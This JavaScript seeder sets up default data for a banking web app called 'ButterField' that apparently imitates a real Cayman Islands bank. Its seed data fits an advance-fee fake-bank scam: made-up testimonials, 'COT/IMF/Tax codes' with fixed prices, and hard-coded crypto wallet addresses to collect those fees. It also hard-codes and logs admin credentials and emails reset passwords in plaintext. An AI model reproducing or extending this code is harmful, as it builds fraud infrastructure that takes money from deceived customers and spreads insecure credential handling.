/**
 * Database Seeder - Creates default data for the FinTech banking app.
 * Runs automatically on server startup if collections are empty.
 */
const User = require('../models/User');
const Admin = require('../models/Admin');
const {
  Setting, FAQ, Testimonial, BasicContent,
  PaymentGateway, EmailTemplate, AuthAccount, AuthConfig,
  News
} = require('../models/ExtraModels');

async function seedDatabase() {
  try {
    // 1. Admin Account - ALWAYS ensure correct credentials by deleting and recreating
    await Admin.deleteMany({});
    const admin = new Admin({
      admin_username: 'pandashoki',
      admin_email: 'admin@butterfieldapp.com',
      admin_password: 'Loskiloose00@@22',
      role: 1
    });
    await admin.save();
    console.log('✅ Admin account created: pandashoki / Loskiloose00@@22');

    // 2. System Settings
    const settingCount = await Setting.countDocuments();
    if (settingCount === 0) {
      await Setting.create({
        company_name: 'ButterField',
        company_description: 'Modern Digital Banking, Smart Investments, Global Transfers',
        company_keyword: 'ButterField Offshore, Fintech Banking, Digital Bank',
        company_email: 'customercare@butterfieldapp.com',
        noreply: 'noreply@butterfieldapp.com',
        company_address: 'Butterfield Place, 12 Albert Panton Street, Grand Cayman KY1-1107, CAYMAN ISLANDS',
        company_phone: '07915636507',
        abrv: 'BFA',
        theme_color: '#1a1a2e',
        secondary_color: '#e94560',
        theme: 'finapp-light',
        template: 'bank-pro',
        max_upload: '5',
        min_deposit: 500,
        bank_routing: 655205039,
        otp: 1,
        wire_fee: 1,
        loan: 1,
        login_notify: 1,
        allow_register: 1,
        live_chat: 0,
        im_chat: 1,
        im_position: 'left',
        whatsapp: '',
        telegram: ''
      });
      console.log('✅ Created default system settings');
    }

    // 3. Basic Content (About, Terms)
    const basicCount = await BasicContent.countDocuments();
    if (basicCount === 0) {
      await BasicContent.create({
        title: 'about',
        value: '<h3>About ButterField</h3><p>ButterField is a modern digital banking platform providing secure financial services, global transfers, and smart investment opportunities. Our mission is to make banking accessible, transparent, and efficient for everyone.</p>'
      });
      await BasicContent.create({
        title: 'terms',
        value: '<h3>Terms and Conditions</h3><p>By using ButterField services, you agree to comply with our terms and conditions. All transactions are subject to verification and approval. ButterField reserves the right to modify these terms at any time.</p>'
      });
      console.log('✅ Created default about & terms content');
    }

    // 4. FAQ
    const faqCount = await FAQ.countDocuments();
    if (faqCount === 0) {
      const faqs = [
        { question: 'How do I open an account?', answer: 'Click on "Open Account" on our homepage, fill in your details, upload the required KYC documents, and submit. Your account will be activated after verification.' },
        { question: 'How do I make a transfer?', answer: 'Login to your dashboard, navigate to the Transfer section, enter beneficiary details, amount, and your security PIN to complete the transfer.' },
        { question: 'What currencies are supported?', answer: 'We support multiple currencies including USD, EUR, GBP, and others. Your default currency is set during account opening.' },
        { question: 'How do I reset my password?', answer: 'Click on "Forgot Password" on the login page, enter your account ID or email, and follow the instructions sent to your registered email.' },
        { question: 'How can I contact support?', answer: 'You can submit a support ticket from your dashboard, email us at customercare@butterfieldapp.com, or use the live chat feature on our website.' },
        { question: 'What is a COT/IMF/Tax code?', answer: 'These are security codes assigned to your account for transaction verification. COT (Cost of Transfer), IMF (International Monetary Fund code), and Tax ID are used for different types of transactions.' },
        { question: 'How long do transfers take?', answer: 'Internal transfers are instant. External transfers typically take 1-3 business days depending on the destination and transfer type.' },
        { question: 'Is my money safe?', answer: 'Yes, we use industry-standard encryption and security protocols to protect your account and transactions. We also monitor accounts for suspicious activity 24/7.' }
      ];
      await FAQ.insertMany(faqs);
      console.log('✅ Created default FAQs');
    }

    // 5. Testimonials
    const testimonialCount = await Testimonial.countDocuments();
    if (testimonialCount === 0) {
      await Testimonial.insertMany([
        { name: 'Sarah Johnson', content: 'ButterField has transformed how I manage my finances. The platform is intuitive and the customer support is exceptional!', image: 'user-default.png' },
        { name: 'Michael Chen', content: 'I\'ve been banking with ButterField for 6 months now. International transfers are fast and the fees are very reasonable.', image: 'user-default.png' },
        { name: 'Emily Rodriguez', content: 'The account opening process was smooth and straightforward. Highly recommend ButterField for their professional service.', image: 'user-default.png' }
      ]);
      console.log('✅ Created default testimonials');
    }

    // 6. Payment Gateways
    const gatewayCount = await PaymentGateway.countDocuments();
    if (gatewayCount === 0) {
      await PaymentGateway.insertMany([
        { name: 'BITCOIN', status: 1, ticker: 'btc', barcode: 1 },
        { name: 'USDT Erc20', status: 1, ticker: 'usdt', barcode: 1 },
        { name: 'USDC Erc20', status: 1, ticker: 'usdc', barcode: 1 }
      ]);
      console.log('✅ Created default payment gateways');
    }

    // 7. Email Templates
    const emailTemplateCount = await EmailTemplate.countDocuments();
    if (emailTemplateCount === 0) {
      const templates = [
        {
          name: 'Login Notification',
          subject: 'Login Notification - {site_name}',
          body: '<p>Hello {user_full_name},</p><p>Your account (ID: {acc_id}) was just logged into from IP: {ip_address} on {current_date} from {login_location}.</p><p>If this was you, no action is needed. If not, please contact support immediately.</p>'
        },
        {
          name: 'Reset Password',
          subject: 'Password Reset - {site_name}',
          body: '<p>Hello {user_full_name},</p><p>Your new password is: <strong>{new_password}</strong></p><p>Please login with this new password and change it from your profile settings.</p>'
        },
        {
          name: 'Admin Reset Password',
          subject: 'Admin Password Reset - {site_name}',
          body: '<p>Hello {admin_username},</p><p>Click the link below to reset your admin password:</p><p><a href="{site_url}auth/password?token={the_token}">Reset Password</a></p>'
        },
        {
          name: 'Admin Password Changed',
          subject: 'Admin Password Changed - {site_name}',
          body: '<p>Hello {admin_username},</p><p>Your admin password has been changed successfully.</p>'
        },
        {
          name: 'Debit Alert',
          subject: 'Debit Alert - {site_name}',
          body: '<p>Hello {user_full_name},</p><p>A debit transaction of {amount} has been made from your account (Ref: {reference}).</p><p>New balance: {balance}</p>'
        },
        {
          name: 'Credit Alert',
          subject: 'Credit Alert - {site_name}',
          body: '<p>Hello {user_full_name},</p><p>A credit transaction of {amount} has been made to your account (Ref: {reference}).</p><p>New balance: {balance}</p>'
        },
        {
          name: 'OTP',
          subject: 'OTP Verification - {site_name}',
          body: '<p>Hello {user_full_name},</p><p>Your OTP code is: <strong>{otp_code}</strong></p><p>This code will expire in 10 minutes.</p>'
        }
      ];
      await EmailTemplate.insertMany(templates);
      console.log('✅ Created default email templates');
    }

    // 8. Auth Config
    const authConfigCount = await AuthConfig.countDocuments();
    if (authConfigCount === 0) {
      await AuthConfig.create({
        prices: { COT: 525, IMF: 1200, TAX: 3200 },
        wallets: {
          BTC: 'bc1q457uwgjcj8dt88v27n2awqxp22lzjhngfsg3w9',
          USDT: '0x68199b6E4580f5a225C35b1707466Cae26C57B02',
          USDC: '0x68199b6E4580f5a225C35b1707466Cae26C57B02'
        }
      });
      console.log('✅ Created default auth config');
    }

    // 9. Sample Auth Accounts
    const authAccountCount = await AuthAccount.countDocuments();
    if (authAccountCount === 0) {
      await AuthAccount.insertMany([
        { account_id: '9383766443', name: 'Declan Brock', password: 'PLO635355367', code_type: 'COT' },
        { account_id: '9837466422', name: 'Nelson Kloosterman', password: 'ndkclb$323450)93', code_type: 'COT' }
      ]);
      console.log('✅ Created sample auth accounts');
    }

    // 10. Sample News
    const newsCount = await News.countDocuments();
    if (newsCount === 0) {
      await News.create({
        title: 'Welcome to ButterField Digital Banking',
        body: '<p>We are excited to announce the launch of our new digital banking platform. Experience seamless banking with instant transfers, competitive rates, and world-class security.</p><p>Our platform offers:</p><ul><li>Instant internal transfers</li><li>Global wire transfers</li><li>Multi-currency support</li><li>24/7 customer support</li><li>Advanced security features</li></ul>',
        status: '1'
      });
      console.log('✅ Created sample news article');
    }

    console.log('🌱 Database seeding completed successfully');
  } catch (error) {
    console.error('❌ Seeding error:', error);
  }
}

module.exports = seedDatabase;